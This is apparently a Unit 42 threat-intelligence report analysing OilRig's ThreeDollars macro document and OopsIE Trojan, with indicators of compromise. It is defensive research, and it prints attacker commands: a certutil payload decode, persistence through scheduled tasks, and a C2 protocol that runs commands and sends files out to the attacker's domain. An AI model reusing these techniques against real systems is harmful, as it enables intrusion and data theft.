{
    "title": "oopsie! oilrig uses threedollars to deliver new trojan",
    "text": "Tools\nPlaybooks\nSpeaking Events\nAbout Us\nOopsIE! OilRig Uses ThreeDollars to Deliver New\nTrojan\n26,132\npeople reacted\n2\n11 min. read\nThis post is also available in: 日本語  (Japanese )\nThe OilRig  group remains highly active in their attack campaigns while they continue to evolve their toolset. On\nJanuary 8, 2018, Unit 42 observed the OilRig threat group carry out an attack on an insurance agency based in\nthe Middle East. Just over a week later, on January 16, 2018, we observed an attack on a Middle Eastern financial\ninstitution. In both attacks, the OilRig group attempted to deliver a new Trojan that we are tracking as OopsIE.\nThe January 8 attack used a variant of the ThreeDollars delivery document , which we identified as part of the\nOilRig toolset based on attacks that occurred in August 2017 .\nHowever, the attack on January 16 did not involve ThreeDollars at all. Instead, this attack involved delivering the\nOopsIE Trojan directly to the victim, most likely using a link in a spear phishing email. Interestingly, the targeted\norganization in the January 16 attack had already been targeted by the OilRig group a year ago on January 2017.\nThis repeat attack may suggest that the adversaries have lost their foothold in the targeted organization, or that it\nmay be considered a high value target.\n \nA New Attack\nOn January 8, 2018, the OilRig threat group sent an email with the subject Beirut Insurance Seminar\nInvitation  to an insurance agency in the Middle East. The OilRig group sent two emails to two different email\naddresses at the same organization within a six minutes time span. The recipient email addresses suggest they\nmay be the addresses used for specific regional branches of the targeted organization.\nBoth emails originated from the same address. The email address is associated with the Lebanese domain of a\nmajor global financial institution. However, based upon the captured session data, it is highly likely the source\nemail address was spoofed. The email contained an attachment named Seminar-Invitation.doc , which is a\nmalicious Microsoft Word document we track as ThreeDollars. Examining this sample of ThreeDollars reveals\nthat it contains a new payload, which we have named OopsIE.\nIn the January 16, 2018 attack, we observed OilRig attacking an organization it previously targeted in January\n2017. In this case, the ThreeDollars delivery document was not used and instead an attempt was made to deliver\nthe OopsIE Trojan directly to the targeted organization, likely via a link within an email. The Trojan was directly\ndownloaded from the command and control server for OopsIE, signifying that this server was also used for\nstaging. This suggests that due to the January 2017 attack, the targeted organization may have taken actions to\ncounter known OilRig TTPs, in this case delivering malicious macro documents, causing the OilRig operators to\nadopt a different delivery tactic.\nWe also identified another sample of ThreeDollars, created on January 15, 2017 with the file name strategy\npreparation.dot . While this sample was very similar to the Seminar-Invitation.doc  sample it also had\nsome significant differences. The primary difference was that this sample was encrypted and password\nprotected, requiring the victim to enter in a password which was likely provided by the adversary to view the\ndocument. While this is not a new tactic, this is the first instance where we have observed the OilRig using it in\ntheir playbook. Typically, password protected documents is commonly used by adversaries as an evasion tactic to\nbypass automated analysis mechanisms due to the password requirement for successful execution. As we have\nobserved throughout our tracking of the OilRig group, adopting proven tactics has been a common behavior over\ntime.\n \nThreeDollars Document Analysis\nThe samples of ThreeDollars we collected in these attacks are structurally very similar to the first sample we\nanalyzed in October 2017 , down to the lure image used to trick the recipient into clicking the “Enable Content”\nbutton to execute the malicious macro. The images used in the January 2018 attacks were the exact same in\neach sample, verified by file hash.\nFigure 1 shows the lure image extracted from the newer attacks, and the lure image from the first sample we\nanalyzed. While it is unsurprising that attacks originating from the same adversary group would use the same\nresource over time, we analyzed exactly how similar these lure images were.\n \nFigure 1 Side‐by‐side of the lure images within ThreeDollars in the October 2017 and the January 2018 attacks\n \nSuperficially, we can immediately see the images are quite similar, but with some glaring differences. The image\nfrom the August 2017 attack for example, is significantly larger, using an image resolution of 3508 pixels x 4961\npixels which is also the exact resolution for a sheet of A3 paper at 300 dpi. It also contains some additional\nartifacts in the image, such as the inclusion of the Microsoft logo as well as additional text, specifically “against\nunauthorized use”. In comparison, the newer lure image appears to be horizontally distorted due to it being\nresized to fit into the constraints of the document. In addition, the period after “This document is protected” is\nmisaligned.\nBy overlaying these two lure images and accounting for the newer image’s distortion, we are able to clearly\nvisualize that the newer image is highly likely to be a cropped and edited version of the August 2017 image.\n \n \nExamining the color code used in both images also shows they are the exact same, #da3b01. The dimensions of\nthe newer image are roughly 40% of the older October image, suggesting that after cropping and editing the\nnewer image, the creator is also likely to have resized the image. One peculiar artifact from the original image is\nthe usage of the “st” (unicode \\uFB06) ligature  in the word “against”. This is a highly uncommon glyph and is not\ngenerally available in standard keyboard layouts. This may suggest that the string was machine generated rather\nthan directly inputted from a keyboard. The use of this glyph also may suggest that the actor is not a native\nEnglish speaker.\n \nMalicious Macro Analysis\nWhen the victim opens the ThreeDollars document they are presented with the lure image and prompted to\nclick on the “Enable Content” button. When button is clicked, a malicious macro is silently run which installs then\nexecutes a payload on a system. A decoy image is also displayed to the victim to lower suspicion of malicious\nactivity. The decoy message that is eventually presented to the victim does not actually show the expected\ncontent of an insurance seminar invitation as presented in the delivery email. Instead, it displays a fake error\nmessage of NullRefrencedException! error has occurred in user32.dll by 0x32ef2121\nwithin the Word document, as seen in Figure 2.\n \nFigure 2 Decoy message displayed by the malicious macro in ThreeDollars delivery document\n \nWhile the decoy in Figure 2 is displayed, the macro will search the document for the delimiter ###$$$  and write\nthe base64 encoded text that follows this delimiter to the file %APPDATA%\\Base.txt . The macro then creates\na scheduled task named SecurityAssist  that runs after waiting one minute. The SecurityAssist  task is\nresponsible for running the following command line command that uses the Certutil  application to decode the\nbase64 encoded data in Base.txt  and saves the decoded data to the file\n%PROGRAMDATA%\\IntelSecurityAssistManager.exe:\ncmd.exe /c Certutil -decode %appdata%\\Base.txt\n%programdata%\\IntelSecurityAssistManager.exe & SchTasks /Delete /F /TN\nSecurityAssist\nThe macro also creates a second scheduled task named Conhost  that waits two minutes and runs a VBScript\n%APPDATA%\\chkSrv.vbs . The macro saves the chkSrv.vbs  script to the system, which is responsible for\nrunning the IntelSecurityAssistManager.exe  payload (OopsIE Trojan) and cleaning up the installation by\ndeleting the two scheduled tasks, the Base.txt  file, the ThreeDollars document, and the chkSrv.vbs  script.\n \nOopsIE Trojan Analysis\nThe OopsIE Trojan delivered in these attacks is packed with SmartAssembly and further obfuscated with\nConfuserEx v1.0.0. To run persistently on the system, the Trojan will first create a VBScript file:\nSpecialFolder.CommonApplicationData\\srvResesponded.vbs\nthat contains:\nCreateObject(“WScript.Shell”).Run(“%app%”)\nThe Trojan replaces the %app%  string in the above VBScript with the path to its executable. Finally, the Trojan\ncreates a scheduled task to run itself every three minutes by running the following command on the command\nprompt after replacing the %path%  string with the path to the srvResesponded.vbs  VBScript:\nSchTasks /Create /SC MINUTE /MO 3 /TN “InetlSecurityAssistManager” /TR “wscript\n%path%” /f\nThe Trojan uses HTTP to communicate with its C2 server, specifically using the InternetExplorer  application\nobject within an embedded Microsoft .NET Framework assembly called Interop.SHDocVw . The Trojan extracts\nand loads this embedded assembly by concatenating the contents of two resources named S1 and S2 and\ndecompresses the resulting data using the GZipSteam  class. The resulting Interop.SHDocVw  .NET assembly\nis packed with SmartAssembly and further obfuscated using Confuser v1.9.0.0. The concatenation of resources to\nconstruct embedded assemblies is not a new technique for the OilRig group, as they used the very same\ntechnique in October 2017 in their ISMInjector  tool to construct its embedded libraries Joiner.dll  and\nInner.dll .\nBy using the  InternetExplorer  application object, all C2 related requests will look as if they came from the\nlegitimate browser and therefore will not contain any anomalous fields within the request, such as custom User‐\nAgents. The OopsIE Trojan is configured to use a C2 server hosted at:\nwww.msoffice365cdn[.]com\nThe Trojan will construct specific URLs to communicate with the C2 server and parses the C2 server’s response\nlooking for content within the tags <pre>  and </pre> . The initial HTTP request acts as a beacon, as shown in\nthe image below.\n \n \nAs seen in the above request, the Trojan will generate a URL for its beacon with the following structure:\nhttp://<c2 domain>/chk?<hex(Environment.UserName/Environment.MachineName)>\nThe Trojan will issue a request to this URL to check (hence the chk string in the URL) to see if the C2 server has a\ncommand for the Trojan to run. The C2 server will respond to the Trojan’s request by echoing the value\n<hex(Environment.UserName/Environment.MachineName)>  if it wishes to provide additional\ncommands. If the C2 server does not respond with the appropriate echoed data, the Trojan will create a file\nnamed srvCheckresponded.tmp  in the SpecialFolder.CommonApplicationData  folder and write\nnothing to it before exiting.\nIf the C2 server provides the appropriate echoed data in the response, the Trojan attempts to determine what \ncommands the C2 wishes to run by issuing a request to the following URL:\nhttp://<c2 domain>/what?<hex(Environment.UserName/Environment.MachineName)>\nAfter issuing the what  command, the Trojan will parse the C2’s response for the string Oops, which the Trojan\nwill treat as the C2 making a mistake and will exit. Otherwise, the Server will respond with a command followed\nby a set of parameters, split up by the delimiter <>:\n[command]<>[parameters for command in hexadecimal format]\nThe available commands are:\nCommand Description\n1 Run command\n2 Upload a file\n3 Download a specified file\n \nThe parameters for each command are issued in hexadecimal format. For instance, the character A would be\nrepresented by the two characters 41, which is the hexadecimal representation of that character. This\nhexadecimal format is used extensively throughout this Trojan.\nThe run command (1) creates the process cmd.exe /c  with the command parameters appended and will write\nthe output of the command in hexadecimal format to the file %APPDATA%\\tmpCa.vbs.  The Trojan will then\nread the hexadecimal formatted contents of this file in 1500 byte blocks, sending each 1500 bytes of data from\nthe file to the C2 server via an HTTP GET  request to a URL with the following structure:\nhttp://<c2 domain>/resp?\n<hex(Environment.UserName/Environment.MachineName)>AAZ<hex(command prompt\noutput)>\nThe upload command (2) writes data provided by the C2 to a specified file. The parameters supplied to this\ncommand include hexadecimal values for the binary data and the filename, which are split up by a delimiter of\n(!). The Trojan will respond to the C2 to notify it of a successful upload by sending a URL structured as follows:\nhttp://<c2 domain>/resp?\n<hex(Environment.UserName/Environment.MachineName)>AAZ<hex(“File Uploaded”)>\nThe download command (3) reads the contents of a specified file and sends the data to the C2 server. If the file\ndoes not exist, the Trojan will send the C2 server a message < File Not Found >  by sending the following\nURL:\nhttp://<c2 domain>/resp?\n<hex(Environment.UserName/Environment.MachineName)>AAZ<hex(“< File Not Found >”)>\nIf the file exists, the Trojan will read the contents of the specified file and compresses the contents using the\nGZipStream  class. The Trojan then gets the hexadecimal values of the compressed data and will replace the\nfollowing hexadecimal values on each line with ASCII characters to further compressed the data:\n \nString of hexadecimal values Character replacement\n000000 z\n00000 x\n0000 y\n000 g\n00 w\n01 t\n \nThe Trojan then writes 1500 bytes of the hexadecimal formatted data, one per line to a temporary file in the\nSpecialFolder.CommonApplicationData  folder named as:\n<day><hour><second><millisecond>.tmp\nThe Trojan will then read each line from this temporary file and send them to the C2 server by issuing requests to\na URL structured as follows:\nhttp://<c2 domain>/resp?\n<hex(Environment.UserName/Environment.MachineName)>ABZ<hex(1500 characters of\nhexadecimal formatted file contents)>\nOnce all of the lines of hexadecimal formatted data in the temporary file are sent to the C2 server, the Trojan will\nsend a request to the C2 server to notify the data has been successfully transmitted via a URL structured as\nfollows:\nhttp://<c2 domain>/resp?\n<hex(Environment.UserName/Environment.MachineName)>ABZFinish\n \nOverlaps with Previous OilRig Group Attacks\nSince May 2016, we have continued to monitor and uncover various attacks and tools associated with the OilRig\ngroup. As we discover new tools used by this group, we have consistently discovered overlapping artifacts with\npreviously used tools and infrastructure. This type of commonality is unsurprising as we are assuming a single\nadversary, and is an excellent example of how adversaries will often times reuse certain tactics and techniques\nwhether it is for efficiencies sake or sheer laziness.\nIn the attacks described above, we observed a new payload being delivered using a previously unknown\ncommand and control domain. However, as we continued to follow the trail of evidence, we found immediate\nlinks to past attacks and common artifacts from the OilRig group. The most obvious link is the reuse of the\nThreeDollars delivery document, which we had previously observed delivering a different payload. However, we\nalso found other connection to other OilRig group attacks starting with the command and control domain,\nmsoffice365cdn[.]com .\nBeginning with the WHOIS record, we see that the domain was registered by emilia.jones@mail.ru .\nExamining additional domains registered to this email address reveals the domain office365-\nmanagement[.]com , which we previously identified in October 2017 to be an OilRig C2 . Continuing to examine\nthe WHOIS records, we see that a fairly unique phone number is also used in the record. It is only found in one\nother WHOIS record, for the domain office365-technical[.]info , which is registered to\nleonard.horner@mail.ru . Based off the relational links and thematic similarity of the domain name, we have\nstrong reason to believe this domain and registrant are also attributed to the OilRig group.\nMoving onto IP resolutions of the identified domains proves to be fruitful as well. Msoffice365cdn[.]com\nresolves to 80.82.79.221 , which resides on the same class C network range as the IP resolution of\noffice365-technical[.]info , which resolves to 80.82.79.240 . In addition, we find that\n80.82.79.221  shares an SSL certificate with a small number of other IP addresses, one of which is\n185.162.235.29 . This IP resolves to office365-management[.]com  which was one of the domains\nregistered by the emilia.jones@mail.ru  entity. Inspecting the class C network for 185.162.235.0/24\nshows us that another IP on the same network resolves to an OilRig domain, msoffice-cdn[.]com  which we\nidentified in August 2017.\nLastly, we examine the delivery document itself. Although we have already identified the documents as a variant\nof the ThreeDollars tool and analyzed the lure image used in this document in comparison to the previously used\nlure image, additional artifacts also exist to further strengthen the relational link of this sample and the attack to\nprevious OilRig attributed tools and attacks. In this case, one of the ThreeDollars samples we collected contained\na unique author name of J-Win-7-32-Vm.  We had previously observed this author name in use once before,\nin the very first ThreeDollars document we collected that we had reported on in August 2017.\n \n \n \nConclusion\nThe OilRig group continues to remain a highly active adversary in the Middle East region. This group has\nrepeatedly shown evidence of a willingness to adapt and evolve their tactics, while also reusing certain aspects as\nwell. We have now observed this adversary deploy a multitude of tools, with each appearing to be some form of\niterative variation of something used in the past. However, although the tools themselves have morphed over\ntime, the plays they have executed in their playbook largely remain the same when examined over the attack life\ncycle. We have added this play to the OilRig playbook, which can be viewed online via our Playbook Viewer .\nPalo Alto Networks customers are protected from this threat by:\n1. WildFire detects all ThreeDollars and OopsIE payloads with malicious verdicts.\n2. AutoFocus customers can track these tools with the ThreeDollars  and OopsIE\n3. Traps blocks the ThreeDollars delivery documents and the OopsIE payload.\n4. PanAV detects the ThreeDollars samples as Virus/Win32.WGeneric.pefia and the OopsIE payload as\nVirus/Win32.WGeneric.pipwf\n \nIndicators of Compromise\nThreeDollars SHA256\nec3f55cac3e8257d6d48e5d543db758fed7d267f14f63a6a5d98ba7a0fab6870\n81eb43ad46ed39bd4b869c709e5e468a6fc714485da288aaa77c80291ce6db8c\n \nOopsIE SHA256\n9a040cdd7c9fcde337b2c3daa2a7208e225735747dd1366e6c0fcbc56815a07f\n231115a614c99e8ddade4cf4c88472bd3801c5c289595fc068e51b77c2c8563f\n \nOopsIE C2\nwww.msoffice365cdn[.]com\n \nRelated Infrastructure\noffice365-management[.]com\noffice365-technical[.]info\nmsoffice-cdn[.]com\n80.82.79.221\n80.82.79.240\n185.162.235.29\nGet updates from Palo Alto  Networks!\nSign up to receive the latest news, cyber threat intelligence and research from us\nBy Bryan Lee  and Robert Falcone\nFebruary 23, 2018 at 5:00 AM\nCategory: Unit 42\nTags: ConfuserEx , OilRig , OopsIE , SmartAssembly\nEmail address\nSubscribe\nI'm not a robot\nreCAPTCHA\nPrivacy  - Terms\nBy submitting this form, you agree to our Terms of Use  and acknowledge\nour Privacy Statement .\n© 2020 Palo Alto Networks, Inc. All rights reserved.\nPopular Resources\nResource Center\nBlog\nCommunities\nTech Docs\nUnit 42\nSitemap\nLegal No ces\nPrivacy\nTerms of Use\nDocuments\nAccount\nManage Subscriptions\nReport a Vulnerability\nSearch Unit 42\nSHARE \n "
}